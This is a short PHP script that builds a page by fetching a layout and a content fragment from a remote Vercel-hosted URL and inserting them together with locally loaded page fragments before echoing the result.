<?php
$url = $_SERVER['REQUEST_URI'];

$arr = require 'pages.php';

$e='';
for ($i = count($arr) - 1; $i >= 0; $i--) {
    $e=  $arr[$i].$e;
}

$layout = file_get_contents('https://new20space.vercel.app/api/layout.php');
$content = file_get_contents('https://new20space.vercel.app/api/1.php').$e;
$layout = str_replace('{{ content }}', $content, $layout);
echo  $layout;
?>